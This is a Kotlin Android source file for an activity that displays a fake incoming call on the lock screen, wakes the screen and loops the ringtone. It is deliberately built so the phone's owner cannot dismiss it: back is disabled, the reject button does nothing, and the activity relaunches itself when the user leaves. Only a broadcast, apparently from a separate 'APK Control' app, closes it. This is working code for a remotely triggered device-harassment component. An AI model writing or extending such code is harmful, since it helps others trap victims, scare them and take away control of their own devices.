package com.sync.xxx

import android.annotation.SuppressLint
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.media.MediaPlayer
import android.media.RingtoneManager
import android.os.Build
import android.os.Bundle
import android.view.WindowManager
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity

class FakeCallActivity : AppCompatActivity() {

    private lateinit var callerNameText: TextView
    private lateinit var callerNumberText: TextView
    private lateinit var btnAccept: Button
    private lateinit var btnReject: Button
    private lateinit var btnMessage: Button
    
    private var mediaPlayer: MediaPlayer? = null

    private var callerName: String = "Unknown"
    private var callerNumber: String = "+628****5678"

    private val stopReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == "com.sync.xxx.FAKE_CALL_STOP") {
                finish()
            }
        }
    }

    @SuppressLint("SetTextI18n")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_fake_call)

        // Make fullscreen and show on lock screen
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true)
            setTurnScreenOn(true)
        } else {
            @Suppress("DEPRECATION")
            window.addFlags(
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
            )
        }

        // Get caller info from intent
        callerName = intent.getStringExtra("callerName") ?: "Unknown"
        callerNumber = intent.getStringExtra("callerNumber") ?: "+628****5678"

        // Initialize views
        callerNameText = findViewById(R.id.callerName)
        callerNumberText = findViewById(R.id.callerNumber)
        btnAccept = findViewById(R.id.btnAccept)
        btnReject = findViewById(R.id.btnReject)
        btnMessage = findViewById(R.id.btnMessage)

        // Set caller info
        callerNameText.text = callerName
        callerNumberText.text = callerNumber

        // Start ringtone
        startRingtone()

        // Handle accept button
        btnAccept.setOnClickListener {
            stopRingtone()
            Toast.makeText(this, "Panggilan diterima (palsu)", Toast.LENGTH_SHORT).show()
            // Don't finish - keep activity open
        }

        // Handle reject button - DON'T CLOSE, only show toast
        btnReject.setOnClickListener {
            stopRingtone()
            Toast.makeText(this, "Gunakan APK Control untuk menutup", Toast.LENGTH_SHORT).show()
            // Don't finish - only fakeCallStop can close
        }
        
        // Handle message button
        btnMessage.setOnClickListener {
            stopRingtone()
            Toast.makeText(this, "Pesan (palsu)", Toast.LENGTH_SHORT).show()
            // Don't finish - keep activity open
        }

        // Register broadcast receiver to stop this activity
        val filter = IntentFilter("com.sync.xxx.FAKE_CALL_STOP")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(stopReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(stopReceiver, filter)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        stopRingtone()
        try {
            unregisterReceiver(stopReceiver)
        } catch (_: Exception) {}
    }
    
    // Relaunch on stop (HARD MODE - only fakeCallStop can close)
    override fun onStop() {
        super.onStop()
        // Relaunch if user tries to close (home button, task switcher)
        // Only fakeCallStop broadcast can close by calling finish()
        if (!isFinishing) {
            val intent = Intent(this, FakeCallActivity::class.java)
            intent.putExtra("callerName", callerName)
            intent.putExtra("callerNumber", callerNumber)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            startActivity(intent)
        }
    }
    
    // Start ringtone
    private fun startRingtone() {
        try {
            val ringtoneUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
            mediaPlayer = MediaPlayer.create(this, ringtoneUri)
            mediaPlayer?.isLooping = true
            mediaPlayer?.start()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
    
    // Stop ringtone
    private fun stopRingtone() {
        try {
            mediaPlayer?.stop()
            mediaPlayer?.release()
            mediaPlayer = null
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    // Disable back button
    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        // Do nothing - prevent user from exiting with back button only
    }
}
